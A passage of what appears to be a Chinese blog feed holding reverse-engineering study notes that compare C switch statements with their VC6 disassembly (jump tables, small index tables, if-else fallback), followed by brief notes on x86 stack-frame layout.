&quot;%d&quot; (00422024)</span><br><span class="line">0040D751   call        printf (00401060)</span><br><span class="line">0040D756   add         esp,8</span><br><span class="line">15:               break;</span><br><span class="line">0040D759   jmp         $L536+1Eh (0040d779)</span><br><span class="line">16:           case 3:</span><br><span class="line">17:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D75B   push        3</span><br><span class="line">0040D75D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D762   call        printf (00401060)</span><br><span class="line">0040D767   add         esp,8</span><br><span class="line">18:               break;</span><br><span class="line">0040D76A   jmp         $L536+1Eh (0040d779)</span><br><span class="line">19:           default:</span><br><span class="line">20:               printf(&quot;error&quot;);</span><br><span class="line">0040D76C   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D771   call        printf (00401060)</span><br><span class="line">0040D776   add         esp,4</span><br><span class="line">21:               break;</span><br><span class="line">22:       &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/10/6KBvJ8gutZ2bV7x.png" alt="image-20200910121302109.png"></p><p>可以看到没有任何区别</p><h2 id="情况4-1：分支大于等于四个，值是连续的（小）。相差较小"><a href="#情况4-1：分支大于等于四个，值是连续的（小）。相差较小" class="headerlink" title="情况4.1：分支大于等于四个，值是连续的（小）。相差较小"></a>情况4.1：分支大于等于四个，值是连续的（小）。相差较小</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">101</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">102</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">104</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">105</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,65h</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],4</span><br><span class="line">0040D71C   ja          $L536+11h (0040d76c)</span><br><span class="line">0040D71E   mov         ecx,dword ptr [ebp-4]</span><br><span class="line">0040D721   jmp         dword ptr [ecx*4+40D78Ah]</span><br><span class="line">2:            case 101:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D728   push        1</span><br><span class="line">0040D72A   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D72F   call        printf (00401060)</span><br><span class="line">0040D734   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D737   jmp         $L536+1Eh (0040d779)</span><br><span class="line">5:           case 102:</span><br><span class="line">6:               printf(&quot;%d&quot;,2);</span><br><span class="line">0040D739   push        2</span><br><span class="line">0040D73B   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D740   call        printf (00401060)</span><br><span class="line">0040D745   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D748   jmp         $L536+1Eh (0040d779)</span><br><span class="line">8:           case 104:</span><br><span class="line">9:               printf(&quot;%d&quot;,4);</span><br><span class="line">0040D74A   push        4</span><br><span class="line">0040D74C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D751   call        printf (00401060)</span><br><span class="line">0040D756   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D759   jmp         $L536+1Eh (0040d779)</span><br><span class="line">11:           case 105:</span><br><span class="line">12:               printf(&quot;%d&quot;,5);</span><br><span class="line">0040D75B   push        5</span><br><span class="line">0040D75D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D762   call        printf (00401060)</span><br><span class="line">0040D767   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D76A   jmp         $L536+1Eh (0040d779)</span><br><span class="line">14:           default:</span><br><span class="line">15:               printf(&quot;error&quot;);</span><br><span class="line">0040D76C   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D771   call        printf (00401060)</span><br><span class="line">0040D776   add         esp,4</span><br><span class="line">16:               break;</span><br><span class="line">17:       &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/10/cYEdCezfl3H19iJ.png"></p><p>可以看到2（103）的位置变成了default的地址。</p><p>相差较小会用default的值替代少的值</p><h2 id="情况4-2：分支大于等于四个，值是连续的（小），相差偏大"><a href="#情况4-2：分支大于等于四个，值是连续的（小），相差偏大" class="headerlink" title="情况4.2：分支大于等于四个，值是连续的（小），相差偏大"></a>情况4.2：分支大于等于四个，值是连续的（小），相差偏大</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">101</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">102</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">112</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">12</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">113</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">13</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">0040D712   sub         eax,65h</span><br><span class="line">0040D715   mov         dword ptr [ebp-4],eax</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],0Ch</span><br><span class="line">0040D71C   ja          $L536+11h (0040d774)</span><br><span class="line">0040D71E   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D721   xor         ecx,ecx</span><br><span class="line">0040D723   mov         cl,byte ptr  (0040d7a6)[edx]</span><br><span class="line">0040D729   jmp         dword ptr [ecx*4+40D792h]</span><br><span class="line">2:            case 101:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D730   push        1</span><br><span class="line">0040D732   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D737   call        printf (00401060)</span><br><span class="line">0040D73C   add         esp,8</span><br><span class="line">3:                break;</span><br><span class="line">0040D73F   jmp         $L536+1Eh (0040d781)</span><br><span class="line">4:           case 102:</span><br><span class="line">5:               printf(&quot;%d&quot;,2);</span><br><span class="line">0040D741   push        2</span><br><span class="line">0040D743   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D748   call        printf (00401060)</span><br><span class="line">0040D74D   add         esp,8</span><br><span class="line">6:               break;</span><br><span class="line">0040D750   jmp         $L536+1Eh (0040d781)</span><br><span class="line">7:           case 112:</span><br><span class="line">8:               printf(&quot;%d&quot;,12);</span><br><span class="line">0040D752   push        0Ch</span><br><span class="line">0040D754   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D759   call        printf (00401060)</span><br><span class="line">0040D75E   add         esp,8</span><br><span class="line">9:               break;</span><br><span class="line">0040D761   jmp         $L536+1Eh (0040d781)</span><br><span class="line">10:           case 113:</span><br><span class="line">11:               printf(&quot;%d&quot;,13);</span><br><span class="line">0040D763   push        0Dh</span><br><span class="line">0040D765   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D76A   call        printf (00401060)</span><br><span class="line">0040D76F   add         esp,8</span><br><span class="line">12:               break;</span><br><span class="line">0040D772   jmp         $L536+1Eh (0040d781)</span><br><span class="line">13:           default:</span><br><span class="line">14:               printf(&quot;error&quot;);</span><br><span class="line">0040D774   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D779   call        printf (00401060)</span><br><span class="line">0040D77E   add         esp,4</span><br><span class="line">15:               break;</span><br><span class="line">16:       &#125;</span><br></pre></td></tr></table></figure><p>这个和前面的区别是，这个不是直接开始计算，而是把0040d7a6+edx的值传到cl中再做运算，0040d7a6的位置就是小表的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040D71E   mov         edx,dword ptr [ebp-4]</span><br><span class="line">0040D721   xor         ecx,ecx</span><br><span class="line">0040D723   mov         cl,byte ptr  (0040d7a6)[edx]</span><br><span class="line">0040D729   jmp         dword ptr [ecx*4+40D792h]</span><br></pre></td></tr></table></figure><p>小表：</p><p><img src="https://i.loli.net/2020/09/10/FuAo4K89XEtOmCR.png" alt="image-20200910132539736.png"></p><p>然后会根据小表去查大表，这里04加进表达式算，最终结果是default的地址。</p><p>好处是在大表中节省了空间，小表只需要占用1个字节。</p><h2 id="情况4-3：分支大于等于四个，值是连续的，相差很大"><a href="#情况4-3：分支大于等于四个，值是连续的，相差很大" class="headerlink" title="情况4.3：分支大于等于四个，值是连续的，相差很大"></a>情况4.3：分支大于等于四个，值是连续的，相差很大</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1000</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10000</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">10000</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   cmp         dword ptr [ebp-4],3E8h</span><br><span class="line">0040D716   jg          main+3Fh (0040d72f)</span><br><span class="line">0040D718   cmp         dword ptr [ebp-4],3E8h</span><br><span class="line">0040D71F   je          main+6Ch (0040d75c)</span><br><span class="line">0040D721   cmp         dword ptr [ebp-4],1</span><br><span class="line">0040D725   je          main+4Ah (0040d73a)</span><br><span class="line">0040D727   cmp         dword ptr [ebp-4],64h</span><br><span class="line">0040D72B   je          main+5Bh (0040d74b)</span><br><span class="line">0040D72D   jmp         main+94h (0040d784)</span><br><span class="line">0040D72F   cmp         dword ptr [ebp-4],2710h</span><br><span class="line">0040D736   je          main+80h (0040d770)</span><br><span class="line">0040D738   jmp         main+94h (0040d784)</span><br><span class="line">2:            case 1:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D73A   push        1</span><br><span class="line">0040D73C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D741   call        printf (00401060)</span><br><span class="line">0040D746   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D749   jmp         main+0A1h (0040d791)</span><br><span class="line">5:           case 100:</span><br><span class="line">6:               printf(&quot;%d&quot;,100);</span><br><span class="line">0040D74B   push        64h</span><br><span class="line">0040D74D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D752   call        printf (00401060)</span><br><span class="line">0040D757   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D75A   jmp         main+0A1h (0040d791)</span><br><span class="line">8:           case 1000:</span><br><span class="line">9:               printf(&quot;%d&quot;,1000);</span><br><span class="line">0040D75C   push        3E8h</span><br><span class="line">0040D761   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D766   call        printf (00401060)</span><br><span class="line">0040D76B   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D76E   jmp         main+0A1h (0040d791)</span><br><span class="line">11:           case 10000:</span><br><span class="line">12:               printf(&quot;%d&quot;,10000);</span><br><span class="line">0040D770   push        2710h</span><br><span class="line">0040D775   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D77A   call        printf (00401060)</span><br><span class="line">0040D77F   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D782   jmp         main+0A1h (0040d791)</span><br><span class="line">14:           default:</span><br><span class="line">15:               printf(&quot;error&quot;);</span><br><span class="line">0040D784   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D789   call        printf (00401060)</span><br><span class="line">0040D78E   add         esp,4</span><br><span class="line">16:               break;</span><br><span class="line">17:       &#125;</span><br></pre></td></tr></table></figure><p>就按照if..else的方式去生成了</p><h2 id="情况5-1：前面按顺序，后面一个不按顺序"><a href="#情况5-1：前面按顺序，后面一个不按顺序" class="headerlink" title="情况5.1：前面按顺序，后面一个不按顺序"></a>情况5.1：前面按顺序，后面一个不按顺序</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1000</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">1:        switch(1)&#123;</span><br><span class="line">0040D708   mov         dword ptr [ebp-4],1</span><br><span class="line">0040D70F   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D713   jg          main+39h (0040d729)</span><br><span class="line">0040D715   cmp         dword ptr [ebp-4],3</span><br><span class="line">0040D719   je          main+6Ch (0040d75c)</span><br><span class="line">0040D71B   cmp         dword ptr [ebp-4],1</span><br><span class="line">0040D71F   je          main+4Ah (0040d73a)</span><br><span class="line">0040D721   cmp         dword ptr [ebp-4],2</span><br><span class="line">0040D725   je          main+5Bh (0040d74b)</span><br><span class="line">0040D727   jmp         main+0A2h (0040d792)</span><br><span class="line">0040D729   cmp         dword ptr [ebp-4],4</span><br><span class="line">0040D72D   je          main+7Dh (0040d76d)</span><br><span class="line">0040D72F   cmp         dword ptr [ebp-4],3E8h</span><br><span class="line">0040D736   je          main+8Eh (0040d77e)</span><br><span class="line">0040D738   jmp         main+0A2h (0040d792)</span><br><span class="line">2:            case 1:</span><br><span class="line">3:                printf(&quot;%d&quot;,1);</span><br><span class="line">0040D73A   push        1</span><br><span class="line">0040D73C   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D741   call        printf (00401060)</span><br><span class="line">0040D746   add         esp,8</span><br><span class="line">4:                break;</span><br><span class="line">0040D749   jmp         main+0AFh (0040d79f)</span><br><span class="line">5:           case 2:</span><br><span class="line">6:               printf(&quot;%d&quot;,2);</span><br><span class="line">0040D74B   push        2</span><br><span class="line">0040D74D   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D752   call        printf (00401060)</span><br><span class="line">0040D757   add         esp,8</span><br><span class="line">7:               break;</span><br><span class="line">0040D75A   jmp         main+0AFh (0040d79f)</span><br><span class="line">8:           case 3:</span><br><span class="line">9:               printf(&quot;%d&quot;,3);</span><br><span class="line">0040D75C   push        3</span><br><span class="line">0040D75E   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D763   call        printf (00401060)</span><br><span class="line">0040D768   add         esp,8</span><br><span class="line">10:               break;</span><br><span class="line">0040D76B   jmp         main+0AFh (0040d79f)</span><br><span class="line">11:           case 4:</span><br><span class="line">12:               printf(&quot;%d&quot;,4);</span><br><span class="line">0040D76D   push        4</span><br><span class="line">0040D76F   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D774   call        printf (00401060)</span><br><span class="line">0040D779   add         esp,8</span><br><span class="line">13:               break;</span><br><span class="line">0040D77C   jmp         main+0AFh (0040d79f)</span><br><span class="line">14:           case 1000:</span><br><span class="line">15:               printf(&quot;%d&quot;,1000);</span><br><span class="line">0040D77E   push        3E8h</span><br><span class="line">0040D783   push        offset string &quot;%d&quot; (00422024)</span><br><span class="line">0040D788   call        printf (00401060)</span><br><span class="line">0040D78D   add         esp,8</span><br><span class="line">16:               break;</span><br><span class="line">0040D790   jmp         main+0AFh (0040d79f)</span><br><span class="line">17:           default:</span><br><span class="line">18:               printf(&quot;error&quot;);</span><br><span class="line">0040D792   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D797   call        printf (00401060)</span><br><span class="line">0040D79C   add         esp,4</span><br><span class="line">19:               break;</span><br><span class="line">20:       &#125;</span><br></pre></td></tr></table></figure><p>会按照if..else生成</p><h2 id="5-2-中间有一个乱序"><a href="#5-2-中间有一个乱序" class="headerlink" title="5.2 中间有一个乱序"></a>5.2 中间有一个乱序</h2><p>也会按照if..else生成</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><ol><li>分支少于4的手，没必要用switch，编译器会生成类似if..else之类的反汇编（<strong>也要看编译器，vc6的是少于4</strong>）</li><li>case后面的常量可以是无序的，不影响大表的生成。编译的时候已经把地址排好了。</li><li>因为编译器不同导致switch反汇编也会不同，所以不要死记硬背4或者多少个不连续才会出现小表。</li><li>switch语句会在内存中创造一个大表，把每一个分支语句的地址都存进去。你给switch一个参数，它会根据参数计算一个表达式，通过表达式得到分支语句的地址。</li></ol><h1 id="0x11-函数"><a href="#0x11-函数" class="headerlink" title="0x11 函数"></a>0x11 函数</h1><p>参数传递的时候，宽度默认为4</p><p><code>ebp-4(-8-c-10)</code>通常用来存储局部数据（类似于函数内的局部变量）</p><p><code>ebp+4</code>用来存储返回地址</p><p><code>ebp+8(+c+10)</code>通常用来存储参数</p><p><code>eax</code>通常用来存储函数的返回值</p>]]></content>
      
      
      <categories>
          
          <category> 2020年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向-堆栈图</title>
      <link href="/2020/08/26/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%A0%86%E6%A0%88%E5%9B%BE/"/>
      <url>/2020/08/26/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E5%A0%86%E6%A0%88%E5%9B%BE/</url>
      
